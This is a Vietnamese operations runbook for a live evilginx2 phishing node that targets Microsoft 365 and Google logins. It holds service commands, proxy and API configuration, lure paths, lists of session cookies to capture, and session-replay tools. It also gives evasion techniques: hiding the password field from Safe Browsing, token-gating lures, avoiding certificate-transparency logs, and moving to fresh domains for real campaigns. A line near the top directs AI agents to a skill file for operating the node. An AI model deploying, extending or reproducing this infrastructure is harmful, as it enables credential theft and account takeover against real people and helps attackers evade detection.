# Deploy — node evilginx2 (fake-evilginx-pro) trên VPS

Trạng thái hiện tại của **node production** (1 VPS internet-facing, base
`<BASE>.<ZONE>`, wildcard cert DNS-01). Cập nhật: **2026-09-10**.

> 🔒 **OPSEC**: hostname thật, IP, SSH key path và lure URL đầy đủ chỉ nằm trong docs/worklog
> nội bộ ngoài repo (`.worklog/`, memory) — không bao giờ commit vào package này.

> 🤖 **AI agent**: đọc skill `.zcode/skills/deploying-and-operating-fake-evilginx-pro/SKILL.md`
> trước khi cài đặt/vận hành — tổng hợp runbook + toàn bộ gotcha đã chứng minh (trùng
> `phish_sub`, vacuous completion, autocert burn, Google chặn IP datacenter, silent SNI drop).

## Trạng thái phishlet

| Phishlet | Trạng thái | Ghi chú |
|---|---|---|
| `ms365.yaml` | ✅ **ĐÓNG — production-ready** | Đạt toàn bộ mục tiêu: work flow (ESTSAUTH, #28) + consumer MSA full (`WLSSC` chốt, #54/#92) + mailbox reuse + SB-bypass verified + token-gate + CSD hardening. 2 caveat ghi trong worklog (work-flow E2E trên domain mới chờ hotspot — Umbrella chặn on-net; password-login sau hardening — account test passwordless). Phishlet GIỮ ENABLED trên node |
| `google.yaml` | 🔄 **ĐANG PHÁT TRIỂN** | CSD hardening đã port + deploy. Chặn chính đã giải quyết về mặt phương án: residential upstream proxy (user đã có endpoint, chờ cấu hình). Việc còn lại: hostname → base mới + enable + lure gated + iterate credentials theo POST thật của luồng v3 (`identifier`/`Passwd`/`f.req`) + verify auth_tokens `.google.com` + session reuse |

**URL lure hiện tại:**
- Google: 2 lure (`/QaikTlkU`, `/wPOJgiAn`) trên landing `signin.<BASE>.<ZONE>`
- MS365: `/bTeZorEy` (thường) + `/YEaRlnyX?t=<token>` (token-gated) trên landing `accounts.<BASE>.<ZONE>` — token lấy từ API, không lưu ở đây

## Kiến trúc hiện tại

```
Victim ── DNS *.<BASE>.<ZONE> ──► evilginx2 :443 (internet-facing, VPS cloud)
                                    │  wildcard cert *.<BASE>.<ZONE> (DNS-01, không per-host)
                                    │  botguard: -bg-ja4 t13d15 -bg-trusted 127.0.0.1/32,<VPS_IP>/32
                                    │  lure token-gate: thiếu ?t= → 302 benign (chống SB classify)
                                    ▼
                                 Origin (login.microsoftonline.com / accounts.google.com …)
```

- **InfraGuard ĐÃ TẮT** (`systemctl disable --now infraguard`): lớp L7 kép làm hỏng MS OAuth
  (double-L7). Evilginx đứng trực tiếp :443, botguard tự lo decoy scanner (JA4 allowlist +
  UA blocklist + telemetry probe).
- **Systemd unit** (`/etc/systemd/system/evilginx2.service`):

```
ExecStart=/bin/sh -c 'tail -f /dev/null | <INSTALL_DIR>/evilginx2 \
  -p <INSTALL_DIR>/phishlets -api 9443 \
  -botguard -bg-ja4 t13d15 -bg-trusted 127.0.0.1/32,<VPS_IP>/32'
```

  ⚠ KHÔNG `-jsobf ultra` (làm vỡ JS trang MS login), KHÔNG `-debug` (leak password plaintext
  vào journal). `-bg-trusted` = IP operator/VPS nội bộ, bỏ scoring cho test.
- **API operator**: `:9443` mTLS, cert client tại `~/.evilginx/api/`.

## Google pending — việc cần để đi tiếp

Fork hỗ trợ upstream proxy sẵn (config `proxyConfig` → `setProxy`). Khi có residential/mobile
proxy (http/socks5 + auth):

1. Sửa `~/.evilginx/config.json`:
```json
"proxy": {"enabled": true, "type": "socks5", "address": "<proxy-host>", "port": "<port>",
          "username": "<user>", "password": "<pass>"}
```
2. `sudo systemctl restart evilginx2`
3. Test lại flow: vào lure google → email → password → cookies `.google.com`
   (SID/HSID/SSID/APISID/SAPISID/__Secure-1PSID/__Secure-3PSID) phải capture đủ.

Lưu ý: upstream proxy là TOÀN CỤC (ms365 cũng đi qua — không có hại).

## Upstream proxy + per-target routing (feature #17)

Proxy SOCKS5/HTTP(s) + auth cho upstream. Điểm mạnh: **routes theo domain suffix** — chỉ
domain liệt kê đi qua proxy, còn lại direct. Ví dụ đang chạy trên node: Google qua
residential exit, MS365 giữ IP node.

**Quản trị (API mTLS hoặc console):**
```bash
# API — set full config (applies live, KHÔNG cần restart):
POST /proxy {"enabled":true,"type":"socks5","address":"<host>","port":<port>,
             "username":"<u>","password":"<p>","routes":["google.com","gstatic.com","googleusercontent.com"]}
POST /proxy {"enabled":false}            # off (partial update — key thiếu = giữ nguyên)
GET  /proxy                               # status (password MASKED — không lộ)

# egconsole:
proxy                                     # status
proxy set socks5 <host> <port> <user> <pass> google.com,gstatic.com,googleusercontent.com
proxy route add microsoftonline.com       # thêm suffix đi qua proxy (hot-apply)
proxy route del <suffix> | proxy on | proxy off

# terminal trên node:
proxy | proxy routes | proxy route add|del <suffix> | proxy enable | proxy disable
```

**Lưu ý:** GET trả password MASKED — POST thiếu key `password` sẽ giữ giá trị cũ (partial
update), không bao giờ ghi đè bằng dấu `*`. Routes rỗng = TOÀN BỘ upstream qua proxy
(behavior gốc). Egress residential phải khác IP node — verify bằng
`curl --socks5 <proxy> https://ifconfig.me` trước khi cấu hình.

## Tools phía operator (Windows client)

| Tool | Vai trò |
|---|---|
| `tools/egconsole.py` | Console REPL duy nhất: fleet API (status/phishlets/sessions/lures), `export <id>`, `open <id>` (mở browser signed-in), `tail` (SSH journal), `puppet` — config `tools/my-servers.json` + `tools/console.json` (đều gitignored, mẫu: `*.example.json`) |
| `deploy/session_launcher.py` | Mở Chrome/Edge với cookies session từ API (`--fresh`, `--headless`, `--disable-http2` cho login.live.com) |
| `deploy/export_session_cookies.py` | Xuất cookies db → Cookie-Editor JSON |
| `src/puppet` (evilpuppet-lite) | chromedp headless: auto-login + chờ MFA + push cookies qua API mTLS |

## Quy tắc vận hành (đã chứng minh bằng burn/thiệt hại thật)

- **KHÔNG BAO GIỜ** bật `autocert` / issue per-host cert trên node internet-facing — mỗi cert
  per-host vào CT logs = nguy cơ burn. Wildcard DNS-01 duy nhất (runbook: `wildcard-cert-setup.sh`).
- Domain đã burn x2 bởi Google Safe Browsing (registered domain poisoned) — KHÔNG chạy
  campaign thật trên nó; node chỉ dùng test nội bộ (bypass "unsafe site"). Campaign thật:
  **domain mới** + chạy `wildcard-cert-setup.sh` từ đầu (hướng dẫn đầy đủ trong README.md gốc,
  mục "Domain mới cho campaign").
- **KHÔNG test lure bằng Chrome/Safari thật có Safe Browsing** — test bằng curl/IAB/browser tắt SB
- **PHISHLETS bị gitignore theo thiết kế** (`src/phishlets/*.yaml`) — repo công khai không ship
  phishlet campaign (comment + cấu trúc lộ mục tiêu). Vận hành: đặt file phishlet vào
  `src/phishlets/` trên node; `deploy.sh` cảnh báo nếu thiếu (bỏ qua bằng `ALLOW_NO_PHISHLET=1`).
  Phishlet mẫu cho lab: `examples/phishlets/`
- **Phishlet chung 1 base domain: CẤM trùng `phish_sub`** — trùng là `getPhishletByPhishHost`
  (Go map, ngẫu nhiên) ghép nhầm phishlet → redirect chéo/phiên chết. google dùng `signin`/`gwww`,
  ms365 giữ `accounts`/`www`.
- Lure URL luôn lấy từ console/API (đúng landing host) — hostname lạ ngoài `IsActiveHostname`
  bị evilginx **drop im lặng** (browser treo, không có TLS alert — opsec by design).
- Lure phát campaign dùng bản **token-gated** (`"token":"auto"`) — bare lure URL để dành cho
  crawler thấy redirect benign.
- `-debug` chỉ bật khi iterate rồi TẮT ngay (leak password vào journal); rotate journal nếu đã bật.
- Session work account thật: KHÔNG test trên account công ty (chỉ test account/tenant được cấp).
- Db có plaintext password — redact trước khi archive/share.

## Các fix gần đây (đã build + deploy, commit local)

| Ngày | Fix |
|---|---|
| 2026-09-11 | **CSD hardening v1+v2 (SB bypass — VERIFIED)**: js_inject ms365 (consumer `/ppsecure/post.srf` + work `/login`): v1 xoá `input[type=password]` khỏi DOM (swap `type=text` + `-webkit-text-security:disc`, MutationObserver, submit không đổi); v2 brand lazy-reveal (logo/brand MS ẩn lúc load, hiện sau gesture đầu). Kết quả: Chrome SB bật full flow → không flag. Nghiên cứu cơ chế CSPD kèm nguồn trong worklog |
| 2026-09-11 | Rotate host password `sso`→`login` sau khi `sso` bị flag (flag do test bằng Chrome có SB — client-side detection, không phải crawler) |
| 2026-09-10 | **Lure token-gate**: `Lure.Token` + gate trong lure handling (constant-time compare) + `X-Eg-Gate` marker để OnResponse không rewrite Location benign ngược về phish domain + API `token:"auto"` |
| 2026-09-10 | `session.go`: chặn vacuous-completion (phishlet required=0 không bao giờ auto-done — trước đây session bị đánh dấu hoàn thành oan ngay khi mở lure → flow gãy → Google trả lỗi generic) |
| 2026-09-10 | `http_proxy.go`: log `completion-check` (host/required/captured) mỗi khi session hoàn thành — evidence runtime |
| 2026-09-10 | `hotreload.go`: `RefreshCerts` gate `IsAutocertEnabled` — trước đây mỗi hot-reload gọi ACME cho toàn bộ hostname (nguy cơ per-host cert vào CT = burn + treo TLS handshake) |
| 2026-09-10 | `google.yaml`: rename landing `accounts`→`signin`, `www`→`gwww` (xung đột với ms365) |
| 2026-09-09 | `http_proxy.go`: cookie persist xuống SQLite; `__Host-` cookie không gán Domain (RFC 6265bis); `session.go`: domain all-optional không chặn completion |

## Giới hạn nền tảng đã xác minh (không phá được bằng config)

- **Consumer MSA (outlook/hotmail cá nhân)**: MS phá post-auth flow qua nhiều domain
  (account.live.com...) → password + cookies capture ĐƯỢC, phiên trong browser victim không
  giữ được. Giới hạn cấu trúc — bản Pro tương tự. Work account (single-host AAD) không vướng.
- **Passkey/passwordless**: chống-MITM cấu trúc — phishlet chỉ bắt được khi account dùng password.
- **Google + MITM (kết quả cuối 2026-09-11, đã test 3 tổ hợp):** Google TỪ CHỐI sign-in ở
  server-side bất kể IP (AWS / hosting VN / VNPT residential) và TLS (Go / utls Chrome) —
  botguard của Google gắn origin: trang chạy trên domain phish → bgdata bị chấm thất bại.
  Username capture (f.req) + uTLS + CSD hardening đều hoạt động — điểm nghẽn duy nhất là
  lớp botguard origin-bound. Đây là giới hạn nền tảng của MỌI MITM proxy HTTPS cho Google,
  không phải thiếu sót của fork. Google phishlet giữ lại làm tài liệu tham khảo/có thể mở
  lại khi có hướng mới (vd reverse-full-page, session-token approach).
- `ERR_HTTP2_PROTOCOL_ERROR` giữa Chromium headless ↔ login.live.com: dùng `--disable-http2`.

## File map

| File | Vai trò |
|---|---|
| `deploy.sh` | orchestrator dựng node mới (deps/certs/evilginx/ja4/verify) |
| `wildcard-cert-setup.sh` | wildcard DNS-01 + autocert OFF + renew cron (runbook đổi base/domain mới) |
| `setup_evilginx.sh` / `setup_infraguard.sh` | dựng service (infraguard hiện TẮT — giữ để tuỳ chọn) |
| `templates/*.tpl` | systemd unit + infraguard config **mẫu placeholder** (giá trị thật render trên node, không commit) |
| `session_launcher.py` / `export_session_cookies.py` | client tools cho session reuse |
| `tools/egconsole.py` (ngoài deploy/) | operator console |
